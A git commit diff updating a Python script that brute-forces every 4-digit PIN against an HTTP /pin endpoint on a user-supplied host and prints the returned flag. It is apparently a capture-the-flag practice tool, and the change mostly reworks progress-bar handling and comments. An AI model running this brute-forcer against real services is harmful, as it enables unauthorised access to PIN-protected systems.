58d6763cea6f1535634d153a0d56c0a9d5cae589
okpalindrome <nitinchoudharyn14@gmail.com>
2024-11-24 11:26:41 +0530

    Update pin-bruteforce.py

--- pin-bruteforce.py
+++ pin-bruteforce.py
@@ -1,5 +1,3 @@
-# pip install tqdm
-
 import requests
 from tqdm import tqdm
 
@@ -9,14 +7,19 @@ print(f"Brute forcing {len(str(total_range-1))} digit pin")
 ip = input("Enter ip or url without http(s):// and without end '/': ")
 port = input("Enter port number: ")       
 
-for pin in tqdm(range(total_range), desc="Progress", unit="PIN", ncols=100):
-    formatted_pin = f"{pin:04d}"  
-    # Convert the number to a 4-digit string (e.g., 7 becomes "0007").
-    # change max width from 4 digit pin to any (5, 6) and increase the range.
+# Try every possible 4-digit PIN (from 0000 to 9999)
+with tqdm(range(total_range), desc="Progress", unit=" PIN", ncols=100) as pbar:
+    for pin in pbar:
+        formatted_pin = f"{pin:04d}"  
+        # Convert the number to a 4-digit string (e.g., 7 becomes "0007").
+        # change max width from 4 digit pin to any (5, 6) and increase the range.
 
-    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
+        # Send the request to the server
+        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
 
-    if response.ok and 'flag' in response.json():
-        print(f"\nCorrect PIN found: {formatted_pin}")
-        print(f"Flag: {response.json()['flag']}")
-        exit(0)
+        if response.ok and 'flag' in response.json():
+            pbar.close()
+            print()
+            print(f"Correct PIN found: {formatted_pin}\n")
+            print(f"Flag: {response.json()['flag']}")
+            exit(0)
